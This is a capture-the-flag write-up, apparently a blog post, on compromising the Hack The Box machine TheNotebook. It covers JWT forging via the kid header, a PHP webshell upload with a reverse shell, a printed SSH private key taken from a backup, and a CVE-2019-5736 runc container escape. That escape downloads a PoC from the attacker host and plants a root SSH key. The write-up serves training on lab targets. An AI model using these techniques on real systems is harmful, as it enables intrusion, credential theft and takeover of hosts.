---
title: "[HTB] Machine: TheNotebook"
description: "[HTB] Machine: TheNotebook"
date: 2023-11-02
menu:
  sidebar:
    name: "[HTB] Machine: TheNotebook"
    identifier: htb-machine-TheNotebook
    parent: htb-machines-linux
    weight: 10
hero: images/thenotebook.png
tags: ["HTB", "jwt", "jwt-io", "upload", "webshell", "cve-2019-5736", "runc", "docker", "go"]
---

# TheNotebook
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.230 --min-rate 1000            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 08:23 GMT
Warning: 10.10.10.230 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.230 (10.10.10.230)
Host is up (0.18s latency).
Not shown: 56578 closed tcp ports (conn-refused), 8955 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 212.63 seconds

```
```
└─$ nmap -Pn -p22,80 -sC -sV 10.10.10.230 --min-rate 1000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 11:55 GMT
Nmap scan report for 10.10.10.230 (10.10.10.230)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds

```

- Web Server

![](./images/1.png)

- `gobuster`
```
└─$ gobuster dir -u http://10.10.10.230/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php -t 50 --no-error  

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.230/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,js,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1250]
/register             (Status: 200) [Size: 1422]
/admin                (Status: 403) [Size: 9]
/logout               (Status: 302) [Size: 209] [--> http://10.10.10.230/]

```

## Foothold
- We can register and we are navigated to notes page

![](./images/2.png)

![](./images/3.png)

- We have a `auth` cookie

![](./images/4.png)

- We also receive `uuid`

![](./images/5.png)

- The `cookie` looks like a `jwt`
  - Let's use https://jwt.io/

![](./images/6.png)

- The `kid` points to private key
  - Let's generate a key and make `auth` point to our server
```
└─$ openssl genrsa -out private.key 2048
```

- Using https://jwt.io/, I'll generate a new `jwt` token

![](./images/7.png)

- Replace `auth` cookie in your browser and refresh the page
  - Now we have access to `admin` page

![](./images/8.png)

![](./images/9.png)

- We can view notes
  - One mentions about `php` execution issue
  - Thus, the backend is `php`

![](./images/10.png)

- We can upload files
  - Since we know the fact that the backend is `php`, let's try uploading webshell

![](./images/11.png)

![](./images/12.png)

![](./images/13.png)


- I'll use `mkfifo` payload from https://www.revshells.com/

![](./images/14.png)


## User
- We have
```
www-data@thenotebook:/var$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:01:4a:df:86  txqueuelen 0  (Ethernet)
        RX packets 107146  bytes 14248388 (14.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 132981  bytes 11315596 (11.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.230  netmask 255.255.255.0  broadcast 10.10.10.255
        ether 00:50:56:b9:f6:1d  txqueuelen 1000  (Ethernet)
        RX packets 244411  bytes 20285557 (20.2 MB)
        RX errors 0  dropped 68  overruns 0  frame 0
        TX packets 248977  bytes 24640633 (24.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
<SNIP>
```

- Let's check backup folder
```
www-data@thenotebook:/var/backups$ ls -lha
total 64K
drwxr-xr-x  2 root root 4.0K Nov  4 08:18 .
drwxr-xr-x 14 root root 4.0K Feb 12  2021 ..
-rw-r--r--  1 root root  33K Jul 23  2021 apt.extended_states.0
-rw-r--r--  1 root root 3.6K Feb 24  2021 apt.extended_states.1.gz
-rw-r--r--  1 root root 3.6K Feb 23  2021 apt.extended_states.2.gz
-rw-r--r--  1 root root 3.6K Feb 12  2021 apt.extended_states.3.gz
-rw-r--r--  1 root root 4.3K Feb 17  2021 home.tar.gz

```

- We can inspect it
```
www-data@thenotebook:/var/backups$ tar -tvf home.tar.gz 
drwxr-xr-x root/root         0 2021-02-12 06:24 home/
drwxr-xr-x noah/noah         0 2021-02-17 09:02 home/noah/
-rw-r--r-- noah/noah       220 2018-04-04 18:30 home/noah/.bash_logout
drwx------ noah/noah         0 2021-02-16 10:47 home/noah/.cache/
-rw-r--r-- noah/noah         0 2021-02-16 10:47 home/noah/.cache/motd.legal-displayed
drwx------ noah/noah         0 2021-02-12 06:25 home/noah/.gnupg/
drwx------ noah/noah         0 2021-02-12 06:25 home/noah/.gnupg/private-keys-v1.d/
-rw-r--r-- noah/noah      3771 2018-04-04 18:30 home/noah/.bashrc
-rw-r--r-- noah/noah       807 2018-04-04 18:30 home/noah/.profile
drwx------ noah/noah         0 2021-02-17 08:59 home/noah/.ssh/
-rw------- noah/noah      1679 2021-02-17 08:59 home/noah/.ssh/id_rsa
-rw-r--r-- noah/noah       398 2021-02-17 08:59 home/noah/.ssh/authorized_keys
-rw-r--r-- noah/noah       398 2021-02-17 08:59 home/noah/.ssh/id_rsa.pub

```

- We have `noah`'s key
  - And we can read it
```
www-data@thenotebook:/var/backups$ tar -xf home.tar.gz -O home/noah/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b
HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD
v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX
rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH
+UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf
Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h
CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM
Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce
YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V
AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/
rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9
0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU
kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE
vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X
i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs
QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K
VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ
vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr
2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ
z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+
8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr
JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
-----END RSA PRIVATE KEY-----

```

- `ssh` as `noah`
```
└─$ ssh noah@10.10.10.230 -i id_rsa 
Warning: Permanently added '10.10.10.230' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov  4 15:55:55 UTC 2023

  System load:  0.16              Processes:              182
  Usage of /:   45.9% of 7.81GB   Users logged in:        0
  Memory usage: 12%               IP address for ens160:  10.10.10.230
  Swap usage:   0%                IP address for docker0: 172.17.0.1


137 packages can be updated.
75 updates are security updates.


Last login: Wed Feb 24 09:09:34 2021 from 10.10.14.5
noah@thenotebook:~$ 

```
## Root
- `sudo`

```
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*

```

- The `docker` version
```
noah@thenotebook:~$ docker -v
Docker version 18.06.0-ce, build 0ffa825
```

- There is [CVE-2019-5736](https://nvd.nist.gov/vuln/detail/CVE-2019-5736)
  - A [blog](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/) with nice explanation
  - [PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)
  - Overwrite `payload` with command we want to run

![](./images/15.png)

```
└─$ go build main.go               
```

- Run `sudo docker exec -it webapp-dev01 bash`
  - And download the `PoC` we built
  - We will need 2 sessions
    - So connect as `noah` via `ssh`
```
noah@thenotebook:~$ sudo docker exec -it webapp-dev01 bash
root@0f4c2517af40:/opt/webapp# wget 10.10.16.4/main
--2023-11-04 18:38:44--  http://10.10.16.4/main
Connecting to 10.10.16.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2119789 (2.0M) [application/octet-stream]
Saving to: ‘main’

main                                                       100%[========================================================================================================================================>]   2.02M   456KB/s    in 7.3s    

2023-11-04 18:38:52 (284 KB/s) - ‘main’ saved [2119789/2119789]

root@0f4c2517af40:/opt/webapp# chmod +x main
```

- From the docker session run the `PoC`
  - It should hang at `[+] Overwritten /bin/sh successfully`
  - Then from the second session as `noah` run `sudo docker exec -it webapp-dev01 /bin/sh`
    - You should see: `No help topic for '/bin/sh'` 
  - Return back to `docker` session and you will see the message that the command was executed
```
root@0f4c2517af40:/opt/webapp# ./main 
[+] Overwritten /bin/sh successfully
[+] Found the PID: 7157
[+] Successfully got the file handle
[+] Successfully got write handle &{0xc0001973e0}
[+] The command executed is#!/bin/bash 
 mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo+qtyTekC0IbR253hJRsWT9Q+wCFVUEwHS7/VZJEOvePL+oIm2LZp9G1ml3FToU6Qr2MtB83tJU7mMFqcKm3mfVTj+lpJzP+XO4A/xHzLiqhZScv56FM0JaZqz65/Oca4FF4AiNS0gOwJ7vu5sARMYFbb5jsd266eCFvymRLobt3Ujzo5lqcRiLOgZPVCasfHU0vPCNGTaMvDKyklhwSCsMbKjOxuozbwZwJ1ApsCkkx7bx277DGgOI6G/rLYFkc/W/+Y9hxqp4RifUzgu6GACKDIKyAnszWxZHNMT/Iokkcn35Xd5p/ykVgrjLBDQKCxTr4Org/M7L9xhvd19GbH kali@kali' > /root/.ssh/authorized_keys
root@0f4c2517af40:/opt/webapp# 
```
```
noah@thenotebook:~$ sudo docker exec -it webapp-dev01 /bin/sh
No help topic for '/bin/sh'
```

- Connect to `ssh`

![](./images/16.png)